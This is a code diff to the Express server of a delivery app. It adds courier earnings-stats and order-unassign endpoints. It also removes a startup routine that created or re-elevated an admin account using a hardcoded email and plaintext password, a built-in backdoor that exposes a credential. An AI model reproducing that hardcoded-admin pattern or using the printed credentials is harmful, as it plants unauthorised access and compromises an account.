@@ -12,46 +12,6 @@ const app = express();
 app.use(cors());
 app.use(express.json());
 
-// ---------- Auto-Initialize Admin Account ----------
-async function initAdmin() {
-  try {
-    const adminEmail = "ess1994dz@outlook.sa";
-    const rawPassword = "Hh24071994@";
-
-    const existingAdmin: any = db.prepare("SELECT * FROM users WHERE email = ?").get(adminEmail);
-
-    if (!existingAdmin) {
-      const hashedPassword = bcrypt.hashSync(rawPassword, 12);
-      db.prepare(`
-        INSERT INTO users (id, name, email, phone, password_hash, role, created_at, online, approved)
-        VALUES (?, ?, ?, ?, ?, ?, ?, 0, 1)
-      `).run(
-        crypto.randomUUID(),
-        "Administrator",
-        adminEmail,
-        "0000000000",
-        hashedPassword,
-        "admin",
-        new Date().toISOString()
-      );
-      console.log("✅ Admin account created successfully!");
-    } else {
-      const hashedPassword = bcrypt.hashSync(rawPassword, 12);
-      db.prepare(`
-        UPDATE users 
-        SET password_hash = ?, role = 'admin', approved = 1 
-        WHERE email = ?
-      `).run(hashedPassword, adminEmail);
-      console.log("ℹ️ Admin account verified and updated.");
-    }
-  } catch (error) {
-    console.error("❌ Error initializing admin user:", error);
-  }
-}
-
-// Execute admin check upon startup
-initAdmin();
-
 function getSettings() {
   const rows = db.prepare("SELECT key,value FROM settings").all() as any[];
   return Object.fromEntries(rows.map((r) => [r.key, Number(r.value)]));
@@ -165,6 +125,29 @@ app.patch("/api/couriers/me/location", auth, role("courier"), (req, res) => {
     req.user!.id
   );
   res.json({ ok: true });
+});
+
+// Courier's own earnings summary: total completed deliveries, the total
+// value of those orders, and the commission split (driven by the real
+// `commission_percent` setting, not a hardcoded number) between the
+// courier's share and the platform's share.
+app.get("/api/couriers/me/stats", auth, role("courier"), (req, res) => {
+  const row: any = db
+    .prepare(
+      "SELECT COUNT(*) c, COALESCE(SUM(final_price),0) r FROM orders WHERE courier_id=? AND status='completed'"
+    )
+    .get(req.user!.id);
+  const s = getSettings();
+  const commissionPercent = s.commission_percent ?? 20;
+  const totalRevenue = row.r;
+  const appCommission = Math.round(totalRevenue * (commissionPercent / 100));
+  const courierEarnings = totalRevenue - appCommission;
+  res.json({
+    ordersCount: row.c,
+    totalRevenue,
+    appCommission,
+    courierEarnings,
+  });
 });
 
 // ---------- Orders ----------
@@ -324,6 +307,23 @@ app.post("/api/orders/:id/pickup", auth, role("courier"), (req, res) => {
   if (o.status !== "accepted") return res.status(409).json({ error: "حالة الطلب غير صالحة" });
   db.prepare("UPDATE orders SET status='picked_up',updated_at=? WHERE id=?").run(new Date().toISOString(), req.params.id);
   recordStatus(req.params.id, "picked_up");
+  res.json({ ok: true });
+});
+
+// A courier backing out of an order they already accepted is different
+// from the customer cancelling it: the order should go back to being
+// available for another courier, not be cancelled outright (the customer
+// still wants their delivery). Only allowed from 'accepted' — once the
+// courier has picked the package up, backing out is no longer offered.
+app.post("/api/orders/:id/unassign", auth, role("courier"), (req, res) => {
+  const o: any = db.prepare("SELECT * FROM orders WHERE id=?").get(req.params.id);
+  if (!o || o.courier_id !== req.user!.id) return res.status(404).json({ error: "الطلب غير موجود" });
+  if (o.status !== "accepted") return res.status(409).json({ error: "لا يمكن التراجع عن هذا الطلب الآن" });
+  db.prepare("UPDATE orders SET courier_id=NULL,status='pending',updated_at=? WHERE id=?").run(
+    new Date().toISOString(),
+    req.params.id
+  );
+  recordStatus(req.params.id, "pending");
   res.json({ ok: true });
 });
 
